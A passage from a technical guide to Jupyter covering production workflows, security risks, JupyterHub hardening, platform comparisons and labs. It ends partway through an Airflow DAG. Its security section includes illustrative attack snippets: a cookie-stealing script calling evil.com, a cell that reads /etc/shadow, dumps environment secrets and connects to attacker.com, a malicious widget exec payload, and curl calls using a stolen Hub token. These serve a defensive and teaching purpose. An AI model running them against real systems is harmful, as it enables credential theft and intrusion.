### 6.1 Notebooks to Production Scripts

**nbconvert extraction:**

```bash
jupyter nbconvert --to script notebook.ipynb
# Produces notebook.py with cell markers as comments
```

Post-processing typically required: remove display calls, add proper CLI interface, extract functions, add logging.

**Structured extraction pattern:**

```python
# In notebook: mark production-ready cells with tags
# Cell metadata: {"tags": ["export"]}

# Extract tagged cells only
import nbformat

with open('notebook.ipynb') as f:
    nb = nbformat.read(f, as_version=4)

export_cells = [cell for cell in nb.cells
                if 'export' in cell.metadata.get('tags', [])]

with open('production_module.py', 'w') as f:
    for cell in export_cells:
        if cell.cell_type == 'code':
            f.write(cell.source + '\n\n')
```

### 6.2 Dagstermill: Notebooks as Pipeline Steps

Dagster integrates notebooks as first-class pipeline assets:

```python
from dagstermill import define_dagstermill_op
from dagster import job, In, Out

analyze_op = define_dagstermill_op(
    name="quarterly_analysis",
    notebook_path="notebooks/quarterly_analysis.ipynb",
    output_notebook_name="executed_quarterly_analysis",
    ins={"raw_data": In(dagster_type=str)},
    outs={"summary": Out(dagster_type=dict)},
)

@job(resource_defs={"output_notebook_io_manager": local_output_notebook_io_manager})
def quarterly_pipeline():
    analyze_op(raw_data="s3://bucket/data/2024-Q1/")
```

Benefits: Notebooks get Dagster's orchestration (retries, scheduling, observability) while preserving the exploratory interface for data scientists.

### 6.3 Papermill in Airflow

```python
from airflow import DAG
from airflow.operators.python import PythonOperator
from datetime import datetime
import papermill as pm

def run_notebook(**context):
    execution_date = context['ds']
    pm.execute_notebook(
        '/opt/airflow/notebooks/daily_metrics.ipynb',
        f'/opt/airflow/outputs/daily_metrics_{execution_date}.ipynb',
        parameters={
            'execution_date': execution_date,
            'lookback_days': 7
        },
        kernel_name='python3',
        request_save_on_cell_execute=True  # Save progress
    )

dag = DAG(
    'daily_metrics_notebook',
    schedule_interval='@daily',
    start_date=datetime(2024, 1, 1),
    catchup=False
)

task = PythonOperator(
    task_id='run_metrics_notebook',
    python_callable=run_notebook,
    dag=dag
)
```

### 6.4 Testing Notebooks

**testbook — Unit testing notebook cells:**

```python
from testbook import testbook

@testbook('notebooks/data_cleaning.ipynb', execute=True)
def test_cleaning_removes_nulls(tb):
    # Execute specific cells
    tb.execute_cell([1, 2, 3])  # Setup cells

    # Get reference to notebook function
    clean_data = tb.ref('clean_data')
    result = clean_data(test_input)

    assert result.isnull().sum().sum() == 0
    assert len(result) > 0

@testbook('notebooks/data_cleaning.ipynb')
def test_outlier_detection(tb):
    tb.inject("""
    import pandas as pd
    test_df = pd.DataFrame({'value': [1, 2, 3, 100, 4, 5]})
    """)
    tb.execute_cell('outlier_detection')  # Execute by tag

    outliers = tb.ref('outliers')
    assert 100 in outliers['value'].values
```

**nbval — Validate notebook outputs haven't changed:**

```bash
# Run notebooks and compare outputs to saved versions
pytest --nbval notebooks/
pytest --nbval-lax notebooks/  # Ignore output differences, just check no errors

# In pytest.ini
[pytest]
addopts = --nbval-lax
testpaths = notebooks/
```

### 6.5 Linting with nbqa

```bash
pip install nbqa

# Run any Python tool on notebooks
nbqa black notebook.ipynb
nbqa isort notebook.ipynb
nbqa flake8 notebook.ipynb --max-line-length 100
nbqa mypy notebook.ipynb --ignore-missing-imports
nbqa pylint notebook.ipynb --disable=C0114,C0115,C0116

# Pre-commit hook
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/nbQA-dev/nbQA
    rev: 1.7.1
    hooks:
      - id: nbqa-black
      - id: nbqa-isort
      - id: nbqa-flake8
        args: ["--max-line-length=100"]
```

### 6.6 When NOT to Use Notebooks

Notebooks are the wrong tool when:

- **Long-running services** — Use proper application frameworks (FastAPI, Flask)
- **Complex software architecture** — Modules, packages, dependency injection are awkward in flat cell structure
- **Team code review** — Notebook diffs are painful; extract to `.py` modules for review
- **Production ML serving** — Use MLflow, Seldon, BentoML for model serving
- **ETL pipelines** — Use dbt, Airflow operators, or Dagster ops for production data pipelines
- **Shared libraries** — Notebooks cannot be imported; extract to packages
- **Stateful debugging** — Hidden state from non-linear execution makes bugs hard to reproduce
- **Large codebases** — No IDE-grade refactoring, no module system, limited testing support

The golden rule: **prototype in notebooks, productionize in modules**. Use Papermill/Dagstermill only when the notebook format adds genuine value (parameterized reports, self-documenting data investigations).

---

## 7. Security Risks

### 7.1 Arbitrary Code Execution

The fundamental security model of Jupyter is that executing a notebook means running arbitrary code with the permissions of the kernel process. This is by design — and the primary attack vector.

**Threat scenarios:**

- **Malicious notebooks** — A user opens a notebook from an untrusted source. Simply opening does NOT execute code, but clicking "Run All" does. However, JavaScript in output cells executes immediately on open.
- **Notebook as dropper** — Encoded payloads in cell outputs that execute on render:

```json
{
  "output_type": "display_data",
  "data": {
    "text/html": "<script>fetch('https://evil.com/steal?token='+document.cookie)</script>"
  }
}
```

- **Supply chain via shared notebooks** — Data science teams commonly share notebooks via Slack, email, or shared drives without integrity verification.

### 7.2 Kernel Security Model

The kernel runs as the user who started the notebook server. There is no sandboxing by default:

- Full filesystem access (read/write any file the user can)
- Network access (exfiltrate data, connect to internal services)
- Process execution (shell out to system commands)
- Access to all environment variables (including secrets)

```python
# A cell in a "data analysis" notebook could:
import subprocess
subprocess.run(['cat', '/etc/shadow'], capture_output=True)

import os
os.environ  # Dump all secrets

import socket
s = socket.socket()
s.connect(('attacker.com', 4444))  # Reverse shell
```

### 7.3 XSS in Notebook Outputs

Notebooks render HTML outputs in the browser. While JupyterLab sanitizes most HTML, vulnerabilities exist:

- **SVG with embedded JavaScript** — Some SVG payloads bypass sanitization
- **Custom MIME types** — Extensions rendering custom MIME types may not sanitize
- **Markdown injection** — Crafted markdown can inject HTML in older versions
- **IFrame-based escapes** — Sandboxed iframes can be misconfigured

Historical CVE examples:
- CVE-2021-32797 — JupyterLab HTML sanitizer bypass via data URIs
- CVE-2022-29238 — Authentication bypass in Jupyter Server
- CVE-2024-22421 — Jupyter Server path traversal

### 7.4 Notebook as Malware Delivery

**nbformat exploits:**

The notebook JSON format can contain unexpected keys that exploiting parsers:

```json
{
  "cells": [...],
  "metadata": {
    "widgets": {
      "application/vnd.jupyter.widget-state+json": {
        "state": {
          "malicious_widget_id": {
            "_model_module": "evil-extension",
            "code": "require('child_process').exec('...')"
          }
        }
      }
    }
  }
}
```

**Attack chain:**

1. Attacker creates notebook with benign-looking analysis
2. Embeds malicious widget state or HTML output
3. Shares via GitHub, Kaggle, or team Slack
4. Victim opens in JupyterLab — JavaScript in outputs executes pre-interaction
5. Or victim runs cells — arbitrary Python executes

### 7.5 JupyterHub Misconfigurations

**Common dangerous misconfigurations:**

| Misconfiguration | Impact |
|-----------------|--------|
| No authentication | Anyone can spawn servers and execute code |
| Exposed API tokens | Programmatic access to start kernels, read files |
| `c.Spawner.cmd = ['jupyterhub-singleuser', '--allow-root']` | Kernel runs as root |
| Missing network policies | Users can reach internal services (databases, admin panels) |
| Shared volumes without read-only | User A can modify User B's data |
| Permissive CORS | Cross-site requests can control kernels |
| Default admin token | Published in examples, never rotated |

**Token exposure:**

JupyterHub generates API tokens stored in the Hub database. If the database is accessible or tokens are logged:

```bash
# With a valid Hub API token:
curl -H "Authorization: token $TOKEN" \
  https://hub.example.com/hub/api/users/victim/server \
  -X POST  # Start victim's server

curl -H "Authorization: token $TOKEN" \
  https://hub.example.com/user/victim/api/kernels \
  -X POST  # Create kernel in victim's server
```

### 7.6 Secret Leakage

Notebooks are notorious for leaking secrets:

1. **Connection strings in cells** — `%sql postgresql://user:password@host/db`
2. **API keys in variables** — `api_key = "sk-proj-abc123..."`
3. **Tokens in outputs** — Error tracebacks revealing environment variables
4. **Credentials in widget state** — Form inputs cached in notebook JSON
5. **`.ipynb_checkpoints/`** — Auto-saved versions may contain secrets even after cell deletion

**Defense:**

```python
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/Yelp/detect-secrets
    rev: v1.4.0
    hooks:
      - id: detect-secrets
        args: ['--baseline', '.secrets.baseline']
        exclude: '.*\.ipynb$'  # Use nbstripout instead

  - repo: https://github.com/kynan/nbstripout
    rev: 0.6.1
    hooks:
      - id: nbstripout
```

### 7.7 Supply Chain: Malicious Extensions

JupyterLab extensions are npm packages with full browser privileges:

- Extensions can read notebook content, kernel outputs, and API tokens
- No sandbox — extensions run in the same browser context as JupyterLab
- Extension registry has no mandatory security review
- Build-time extensions (pre-built) can include arbitrary JavaScript

**Mitigation:** Pin extension versions, review source, use only well-established extensions from known maintainers, disable extension installation in production environments.

---

## 8. JupyterHub Hardening

### 8.1 TLS Termination

Never expose JupyterHub over unencrypted HTTP in any environment beyond localhost development.

**Option 1: Reverse Proxy (recommended):**

```nginx
# /etc/nginx/sites-available/jupyterhub
upstream jupyterhub {
    server 127.0.0.1:8000;
}

map $http_upgrade $connection_upgrade {
    default upgrade;
    '' close;
}

server {
    listen 443 ssl http2;
    server_name jupyter.example.com;

    ssl_certificate /etc/letsencrypt/live/jupyter.example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/jupyter.example.com/privkey.pem;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;
    ssl_prefer_server_ciphers off;
    ssl_session_timeout 1d;
    ssl_session_cache shared:SSL:10m;

    add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;
    add_header X-Content-Type-Options nosniff always;
    add_header X-Frame-Options DENY always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Referrer-Policy strict-origin-when-cross-origin always;

    location / {
        proxy_pass http://jupyterhub;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;

        # WebSocket support (required for kernel communication)
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection $connection_upgrade;

        proxy_buffering off;
    }
}
```

**Option 2: Built-in SSL (simpler, less flexible):**

```python
c.JupyterHub.ssl_key = '/etc/jupyterhub/ssl/key.pem'
c.JupyterHub.ssl_cert = '/etc/jupyterhub/ssl/cert.pem'
```

**Option 3: Kubernetes Ingress with cert-manager:**

```yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: jupyterhub
  annotations:
    cert-manager.io/cluster-issuer: letsencrypt-prod
    nginx.ingress.kubernetes.io/proxy-body-size: "64m"
    nginx.ingress.kubernetes.io/proxy-read-timeout: "3600"
    nginx.ingress.kubernetes.io/proxy-send-timeout: "3600"
    nginx.ingress.kubernetes.io/configuration-snippet: |
      proxy_set_header Upgrade $http_upgrade;
      proxy_set_header Connection "upgrade";
spec:
  ingressClassName: nginx
  tls:
    - hosts:
        - jupyter.example.com
      secretName: jupyterhub-tls
  rules:
    - host: jupyter.example.com
      http:
        paths:
          - path: /
            pathType: Prefix
            backend:
              service:
                name: proxy-public
                port:
                  number: 80
```

### 8.2 Authentication Enforcement

```python
# Disable anonymous access (should be default, verify explicitly)
c.JupyterHub.authenticator_class = 'oauthenticator.generic.GenericOAuthenticator'

# Restrict to allowed users/organizations
c.Authenticator.allowed_users = set()  # Empty = allow all authenticated
c.Authenticator.admin_users = {'admin@example.com'}

# Block list takes precedence
c.Authenticator.blocked_users = {'former-employee@example.com'}

# Session configuration
c.JupyterHub.cookie_max_age_days = 1  # Force re-auth daily
c.JupyterHub.cookie_secret_file = '/srv/jupyterhub/cookie_secret'

# API token security
c.JupyterHub.api_tokens = {}  # Never hardcode tokens
c.JupyterHub.service_tokens = {}
# Use environment variables or secrets manager

# Disable signup (NativeAuthenticator)
c.NativeAuthenticator.open_signup = False
```

### 8.3 Network Policies (Kubernetes)

```yaml
# Isolate user pods from each other and internal services
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: user-pod-isolation
  namespace: jhub
spec:
  podSelector:
    matchLabels:
      component: singleuser-server
  policyTypes:
    - Ingress
    - Egress
  ingress:
    # Only allow traffic from the Hub proxy
    - from:
        - podSelector:
            matchLabels:
              component: proxy
      ports:
        - port: 8888
          protocol: TCP
  egress:
    # Allow DNS
    - to:
        - namespaceSelector: {}
          podSelector:
            matchLabels:
              k8s-app: kube-dns
      ports:
        - port: 53
          protocol: UDP
    # Allow specific external access (e.g., PyPI, data sources)
    - to:
        - ipBlock:
            cidr: 0.0.0.0/0
            except:
              - 10.0.0.0/8       # Block internal network
              - 172.16.0.0/12    # Block internal network
              - 192.168.0.0/16   # Block internal network
      ports:
        - port: 443
          protocol: TCP
    # Allow specific internal data services
    - to:
        - podSelector:
            matchLabels:
              app: data-warehouse
      ports:
        - port: 5432
          protocol: TCP
```

### 8.4 Resource Limits

```python
# KubeSpawner resource limits
c.KubeSpawner.cpu_limit = 4
c.KubeSpawner.cpu_guarantee = 0.25
c.KubeSpawner.mem_limit = '8G'
c.KubeSpawner.mem_guarantee = '512M'

# Storage limits
c.KubeSpawner.storage_capacity = '10Gi'
c.KubeSpawner.storage_access_modes = ['ReadWriteOnce']

# Prevent disk abuse
c.KubeSpawner.extra_container_config = {
    'resources': {
        'limits': {
            'ephemeral-storage': '5Gi'  # Limit /tmp usage
        }
    }
}

# Process/thread limits (via security context)
c.KubeSpawner.extra_container_config = {
    'securityContext': {
        'runAsUser': 1000,
        'runAsGroup': 100,
        'allowPrivilegeEscalation': False,
        'readOnlyRootFilesystem': False,  # Notebooks need /tmp
        'capabilities': {
            'drop': ['ALL']
        }
    }
}
```

### 8.5 Idle Culling

```python
# Built-in idle culler
c.JupyterHub.services = [
    {
        'name': 'idle-culler',
        'command': [
            sys.executable, '-m', 'jupyterhub_idle_culler',
            '--timeout=3600',        # 1 hour idle → cull
            '--max-age=28800',       # 8 hours max regardless of activity
            '--cull-every=300',      # Check every 5 minutes
            '--concurrency=10',      # Parallel API calls
            '--cull-users=False',    # Don't remove user records
        ],
        'admin': True,
    }
]

# z2jh Helm values
cull:
  enabled: true
  timeout: 3600
  every: 300
  maxAge: 28800
  users: false
  removeNamedServers: true
```

### 8.6 Image Security

**Base image hardening:**

```dockerfile
FROM jupyter/scipy-notebook:2024-01-15

USER root

# Remove unnecessary packages
RUN apt-get purge -y --auto-remove \
    wget curl netcat-openbsd nmap \
    && rm -rf /var/lib/apt/lists/*

# Remove shell access (extreme — breaks terminal feature)
# RUN chsh -s /usr/sbin/nologin jovyan

# Install only pinned versions
COPY requirements.txt /tmp/
RUN pip install --no-cache-dir -r /tmp/requirements.txt \
    && rm /tmp/requirements.txt

# Disable extension installation at runtime
RUN jupyter labextension disable @jupyterlab/extensionmanager-extension

# Set restrictive umask
RUN echo "umask 077" >> /home/jovyan/.bashrc

# Drop back to unprivileged user
USER jovyan

# Verify no secrets in image layers
# (Use multi-stage builds if build-time secrets needed)
```

**Image scanning in CI:**

```yaml
# .github/workflows/scan.yaml
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Build image
        run: docker build -t jupyter-custom:${{ github.sha }} .
      - name: Scan with Trivy
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: 'jupyter-custom:${{ github.sha }}'
          severity: 'CRITICAL,HIGH'
          exit-code: '1'
```

### 8.7 RBAC for JupyterHub Admin

JupyterHub 2.0+ uses a role-based access control system:

```python
c.JupyterHub.load_roles = [
    {
        "name": "admin",
        "scopes": [
            "admin:users", "admin:servers", "tokens",
            "access:servers", "list:users", "read:hub"
        ],
        "users": ["platform-admin@example.com"]
    },
    {
        "name": "instructor",
        "scopes": [
            "list:users!group=students",
            "admin:servers!group=students",
            "access:servers!group=students",
            "read:users:activity!group=students"
        ],
        "groups": ["instructors"]
    },
    {
        "name": "student",
        "scopes": [
            "access:servers!user",
            "self"
        ],
        "groups": ["students"]
    },
    {
        "name": "monitoring-service",
        "scopes": [
            "read:users:activity",
            "read:servers",
            "list:users"
        ],
        "services": ["prometheus-exporter"]
    }
]
```

**Scope syntax:**

- `admin:users` — Full CRUD on all users
- `access:servers!user` — Access only own server
- `list:users!group=students` — List only users in the "students" group
- `read:users:activity` — Read user activity timestamps (last login)

### 8.8 Audit Logging

```python
# Enable detailed Hub activity logging
c.JupyterHub.log_level = 'INFO'

# Structured logging for SIEM ingestion
import json
import logging

class JSONFormatter(logging.Formatter):
    def format(self, record):
        log_entry = {
            'timestamp': self.formatTime(record),
            'level': record.levelname,
            'message': record.getMessage(),
            'logger': record.name,
            'user': getattr(record, 'user', None),
            'action': getattr(record, 'action', None),
        }
        return json.dumps(log_entry)

# Apply to Hub logger
handler = logging.StreamHandler()
handler.setFormatter(JSONFormatter())
logging.getLogger('JupyterHub').addHandler(handler)

# Track authentication events
c.Authenticator.enable_auth_state = True

# Kubernetes: use fluentd/fluentbit sidecar for log collection
```

Key events to audit:
- Login successes and failures (with source IP)
- Server start/stop events
- Admin actions (user creation, server access)
- API token creation/revocation
- File access patterns (requires custom kernel middleware)

---

## 9. Alternative Platforms

### 9.1 Google Colab

**Features:**
- Free GPU/TPU access (T4, A100 in Colab Pro)
- Tight Google Drive integration
- Built-in collaboration (Google Docs-style sharing)
- Pre-installed ML libraries (TensorFlow, PyTorch, JAX)
- "Forms" for parameterized cells
- Direct GitHub integration (open notebooks from repos)

**Limitations:**
- Maximum session duration (12h free, 24h Pro)
- RAM limits (12GB free, 32-51GB Pro)
- No persistent filesystem (reinstall packages each session)
- No custom kernels (Python only)
- No real JupyterLab extensions
- Google account required
- Cannot run on-premise / air-gapped environments

**Security Considerations:**
- Code executes on Google's infrastructure — data leaves your control
- Secrets in notebooks sync to Google Drive (often shared)
- No network isolation between user sessions on shared VMs
- Google retains usage telemetry
- Compliance concerns (GDPR, HIPAA) due to data residency

### 9.2 Databricks Notebooks

**Features:**
- Native Apache Spark integration (zero-config clusters)
- Multi-language cells (`%python`, `%sql`, `%scala`, `%r`) in single notebook
- Built-in MLflow tracking and model registry
- Delta Lake native support
- Collaborative editing with comments
- Cluster auto-scaling and spot instance support
- Unity Catalog for governance (column-level access control)
- Serverless SQL warehouses

**Architecture:**
- Notebooks run on Databricks Runtime (DBR) clusters
- Cluster-attached execution (shared or single-user)
- Workspace as version-controlled file system
- Git integration (repos feature)

**Comparison to Jupyter:**
- Tighter big data integration (Spark is native, not bolted on)
- Better multi-language support (kernel switching per cell)
- Enterprise features (audit, lineage, access control) built-in
- Proprietary — vendor lock-in risk
- Expensive at scale ($0.15-0.65/DBU + cloud compute)

### 9.3 AWS SageMaker Studio

**Features:**
- Managed JupyterLab environment
- SageMaker SDK pre-installed (training jobs, endpoints, processing)
- Kernel gateway architecture (compute separate from notebook)
- Instance type switching without losing state
- Integrated experiment tracking
- Model monitor integration
- Git repositories support
- Lifecycle configurations (startup scripts)

**Architecture:**
- EFS-backed persistent storage per user
- SageMaker image (custom conda environments as images)
- Kernel compute spun up/down independently of IDE
- IAM roles for fine-grained AWS service access

**Unique Value:**
- Native connection to S3, Redshift, Athena
- One-click training job deployment
- Built-in bias detection (Clarify)
- A/B testing for model endpoints

### 9.4 Azure Machine Learning Notebooks

**Features:**
- Integrated with Azure ML workspace
- Compute instances (VMs) as notebook hosts
- Terminal access
- IntelliSense via LSP
- Automated ML UI integration
- Dataset versioning and registration
- Pipeline SDK (notebook steps in ML pipelines)

**Security:**
- Azure AD authentication
- Private Link endpoints (no public internet)
- Customer-managed encryption keys
- Virtual network integration
- Managed identities (no credential management)

### 9.5 Hex

**Features:**
- Collaborative SQL + Python notebook environment
- Built-in data connections (warehouse-native)
- Reactive cells (automatic re-execution on dependency change)
- App mode (publish notebooks as interactive dashboards)
- Version control and branching
- Scheduled runs with email/Slack notifications
- dbt integration

**Positioning:**
Analytics-focused. Targets business intelligence teams who want SQL-first workflows with Python escape hatches. Strong visualization and sharing capabilities.

### 9.6 Deepnote

**Features:**
- Real-time collaboration (multi-cursor, presence)
- SQL cells with schema browser
- Built-in integrations (databases, cloud storage, APIs)
- Publishing and embedding
- Scheduled execution
- Environment management (Docker-based)
- Variable explorer and data profiler built-in
- AI code generation features

**Positioning:**
Modern Jupyter alternative focused on collaboration and data team workflows. Closer to standard Jupyter experience than Hex but with better team features.

### 9.7 Observable (JavaScript Notebooks)

**Features:**
- JavaScript-first (D3, Plot, Arquero)
- Reactive runtime (cells re-execute on dependency change, not linear)
- Rich visualization primitives
- Import cells from other notebooks (code reuse)
- Fork/remix culture
- Observable Framework (static site generation from notebooks)

**Key Difference:**
Observable uses a reactive dependency graph, not sequential execution. Changing any cell re-executes all downstream dependents. This eliminates hidden state issues but requires a different mental model.

**Limitations:**
- JavaScript only (no Python/R)
- Not suitable for heavy computation
- Data must fit in browser memory (or use database connectors)

### 9.8 Comparison Matrix

| Feature | Jupyter | Colab | Databricks | SageMaker | Azure ML | Hex | Deepnote |
|---------|---------|-------|-----------|-----------|----------|-----|----------|
| Self-hosted | Yes | No | No | No | No | No | No |
| Multi-language | Yes | Python | Multi | Python/R | Python/R | SQL+Python | Python+SQL |
| Free GPU | No | Yes (T4) | No | No | No | No | Limited |
| Real-time collab | Yes (RTC) | Yes | Yes | No | No | Yes | Yes |
| Enterprise auth | JupyterHub | Google | SCIM/SAML | IAM | Azure AD | SAML | SAML |
| Git integration | Manual | GitHub | Repos | Yes | Yes | Yes | Yes |
| Scheduling | Papermill | No | Jobs | Training | Pipelines | Yes | Yes |
| Big data native | Via PySpark | Limited | Spark native | SageMaker | Spark/Synapse | Warehouses | No |
| On-premise | Yes | No | Yes (E2) | No | Yes (Arc) | No | No |
| Cost | Free + infra | Free/$$ | $$$$ | $$$ | $$$ | $$ | $$ |
| Vendor lock-in | None | Low | High | Medium | Medium | Low | Low |

---

## 10. Lab Exercises

### Lab 1: Deploy JupyterHub on Kubernetes with Security Hardening

**Objective:** Deploy a production-grade JupyterHub on a Kubernetes cluster with proper security controls, network isolation, TLS, and RBAC.

**Prerequisites:**
- Kubernetes cluster (kind/minikube for local, EKS/GKE/AKS for production)
- `kubectl`, `helm`, `openssl` installed
- Domain name with DNS control (for TLS)

**Steps:**

**1.1 Namespace and RBAC:**

```bash
kubectl create namespace jupyterhub

# Create service account with minimal permissions
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: ServiceAccount
metadata:
  name: jupyterhub
  namespace: jupyterhub
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: jupyterhub-role
  namespace: jupyterhub
rules:
  - apiGroups: [""]
    resources: ["pods", "persistentvolumeclaims", "services"]
    verbs: ["create", "delete", "get", "list", "watch", "patch"]
  - apiGroups: [""]
    resources: ["events"]
    verbs: ["get", "list", "watch"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: jupyterhub-binding
  namespace: jupyterhub
subjects:
  - kind: ServiceAccount
    name: jupyterhub
    namespace: jupyterhub
roleRef:
  kind: Role
  name: jupyterhub-role
  apiGroup: rbac.authorization.k8s.io
EOF
```

**1.2 Helm Values with Security Hardening:**

```yaml
# values-secure.yaml
proxy:
  https:
    enabled: true
    type: letsencrypt
    letsencrypt:
      contactEmail: security@example.com
  service:
    type: LoadBalancer
    annotations:
      service.beta.kubernetes.io/aws-load-balancer-backend-protocol: tcp
  chp:
    extraCommandLineFlags:
      - "--no-include-prefix"

hub:
  config:
    JupyterHub:
      authenticator_class: github
      admin_access: false  # Admins cannot access user servers by default
      cookie_max_age_days: 0.5
    GitHubOAuthenticator:
      client_id: "${GITHUB_CLIENT_ID}"
      client_secret: "${GITHUB_CLIENT_SECRET}"
      oauth_callback_url: "https://jupyter.example.com/hub/oauth_callback"
      allowed_organizations:
        - data-team
      scope:
        - read:org
    Authenticator:
      admin_users:
        - lead-engineer
  networkPolicy:
    enabled: true
    egress:
      - to:
          - ipBlock:
              cidr: 0.0.0.0/0
        ports:
          - port: 443
            protocol: TCP

singleuser:
  image:
    name: registry.example.com/jupyter-hardened
    tag: "v1.2.3"
    pullPolicy: Always
  storage:
    dynamic:
      storageClass: encrypted-gp3
      capacity: 10Gi
  memory:
    limit: 4G
    guarantee: 1G
  cpu:
    limit: 2
    guarantee: 0.5
  extraEnv:
    JUPYTER_RUNTIME_DIR: "/tmp/jupyter_runtime"
  profileList:
    - display_name: "Standard (4GB RAM, 2 CPU)"
      default: true
    - display_name: "Large (16GB RAM, 4 CPU)"
      kubespawner_override:
        mem_limit: "16G"
        mem_guarantee: "4G"
        cpu_limit: 4
        cpu_guarantee: 1
  networkPolicy:
    enabled: true
    egress:
      - to:
          - ipBlock:
              cidr: 0.0.0.0/0
              except:
                - 10.0.0.0/8
                - 172.16.0.0/12
                - 192.168.0.0/16
        ports:
          - port: 443
            protocol: TCP
      # Allow access to internal data warehouse
      - to:
          - podSelector:
              matchLabels:
                app: postgres-warehouse
        ports:
          - port: 5432
            protocol: TCP

cull:
  enabled: true
  timeout: 3600
  every: 300
  maxAge: 28800

scheduling:
  userScheduler:
    enabled: true
  podPriority:
    enabled: true
```

**1.3 Deploy and Verify:**

```bash
# Install with secrets from environment
helm upgrade --install jupyterhub jupyterhub/jupyterhub \
  --namespace jupyterhub \
  --version 3.2.1 \
  --values values-secure.yaml \
  --set hub.config.GitHubOAuthenticator.client_id=$GITHUB_CLIENT_ID \
  --set hub.config.GitHubOAuthenticator.client_secret=$GITHUB_CLIENT_SECRET

# Verify network policies are active
kubectl get networkpolicies -n jupyterhub

# Test user isolation (from within a user pod)
kubectl exec -it jupyter-testuser-0 -n jupyterhub -- \
  curl -s --max-time 5 http://jupyter-otheuser:8888 && echo "FAIL: cross-user access" || echo "PASS: isolated"

# Verify TLS
curl -sI https://jupyter.example.com | grep -i strict-transport
```

**1.4 Validation Checklist:**

- [ ] TLS certificate valid and HSTS header present
- [ ] Authentication required (unauthenticated access returns 302 to login)
- [ ] Network policies prevent user-to-user communication
- [ ] Resource limits enforced (OOM kill triggers at limit)
- [ ] Idle culler stops servers after timeout
- [ ] Admin cannot access user servers (admin_access=false)
- [ ] Container runs as non-root
- [ ] No privileged capabilities

---

### Lab 2: Parameterized Data Pipeline with Papermill + Airflow

**Objective:** Build a data pipeline that executes parameterized notebooks on a schedule, producing dated output reports.

**Prerequisites:**
- Apache Airflow 2.x installed
- Python environment with papermill, pandas, sqlalchemy

**2.1 Template Notebook (`notebooks/daily_metrics.ipynb`):**

Create a notebook with the following cells:

```python
# Cell 1: Parameters (tag this cell with "parameters")
execution_date = "2024-01-01"
lookback_days = 7
output_format = "html"
alert_threshold = 0.95
db_connection = "postgresql://analyst@warehouse:5432/analytics"
```

```python
# Cell 2: Setup
import pandas as pd
import matplotlib.pyplot as plt
from sqlalchemy import create_engine
from datetime import datetime, timedelta
import warnings
warnings.filterwarnings('ignore')

engine = create_engine(db_connection)
end_date = datetime.strptime(execution_date, '%Y-%m-%d')
start_date = end_date - timedelta(days=lookback_days)
print(f"Analyzing: {start_date.date()} to {end_date.date()}")
```

```python
# Cell 3: Data Extraction
query = """
SELECT
    date_trunc('hour', event_time) AS hour,
    event_type,
    COUNT(*) AS event_count,
    COUNT(DISTINCT user_id) AS unique_users,
    AVG(response_time_ms) AS avg_response_ms,
    PERCENTILE_CONT(0.95) WITHIN GROUP (ORDER BY response_time_ms) AS p95_response_ms
FROM events
WHERE event_time BETWEEN %(start)s AND %(end)s
GROUP BY 1, 2
ORDER BY 1, 2
"""

df = pd.read_sql(query, engine, params={'start': start_date, 'end': end_date})
print(f"Loaded {len(df)} rows")
df.head()
```

```python
# Cell 4: Analysis and Alerting
anomalies = df[df['p95_response_ms'] > alert_threshold * 1000]
if len(anomalies) > 0:
    print(f"ALERT: {len(anomalies)} periods exceeded {alert_threshold*1000}ms p95 threshold")
    display(anomalies[['hour', 'event_type', 'p95_response_ms']].head(10))
else:
    print("All metrics within normal range")
```

```python
# Cell 5: Visualization
fig, axes = plt.subplots(2, 1, figsize=(14, 8), sharex=True)

pivot = df.pivot_table(index='hour', columns='event_type', values='event_count', aggfunc='sum')
pivot.plot(ax=axes[0], title='Event Count by Type')
axes[0].set_ylabel('Count')

pivot_p95 = df.pivot_table(index='hour', columns='event_type', values='p95_response_ms')
pivot_p95.plot(ax=axes[1], title='P95 Response Time (ms)')
axes[1].axhline(y=alert_threshold*1000, color='red', linestyle='--', label='Threshold')
axes[1].set_ylabel('ms')
axes[1].legend()

plt.tight_layout()
plt.savefig(f'/opt/airflow/outputs/metrics_{execution_date}.png', dpi=150)
plt.show()
```

**2.2 Airflow DAG:**

```python
# dags/notebook_pipeline.py
from airflow import DAG
from airflow.operators.python import PythonOperator
from airflow.operators.bash import BashOperator
from airflow.utils.dates import days_ago
from datetime import datetime, timedelta
import papermill as pm
import os

default_args = {
    'owner': 'data-team',
    'depends_on_past': False,
    'email_on_failure': True,
    'email': ['data-alerts@example.com'],
    'retries': 2,
    'retry_delay': timedelta(minutes=5),
}

dag = DAG(
    'daily_metrics_notebook',
    default_args=default_args,
    description='Execute daily metrics notebook with Papermill',
    schedule_interval='0 6 * * *',  # 06:00 UTC daily
    start_date=days_ago(1),
    catchup=False,
    tags=['notebooks', 'metrics'],
)

def execute_notebook(**context):
    execution_date = context['ds']
    output_dir = '/opt/airflow/outputs'
    os.makedirs(output_dir, exist_ok=True)

    output_path = f'{output_dir}/daily_metrics_{execution_date}.ipynb'

    pm.execute_notebook(
        '/opt/airflow/notebooks/daily_metrics.ipynb',
        output_path,
        parameters={
            'execution_date': execution_date,
            'lookback_days': 7,
            'output_format': 'html',
            'alert_threshold': 0.95,
            'db_connection': os.environ['WAREHOUSE_CONNECTION_STRING']
        },
        kernel_name='python3',
        cwd='/opt/airflow/notebooks',
        progress_bar=False,
        request_save_on_cell_execute=True
    )
    return output_path

def convert_to_html(**context):
    execution_date = context['ds']
    input_path = f'/opt/airflow/outputs/daily_metrics_{execution_date}.ipynb'
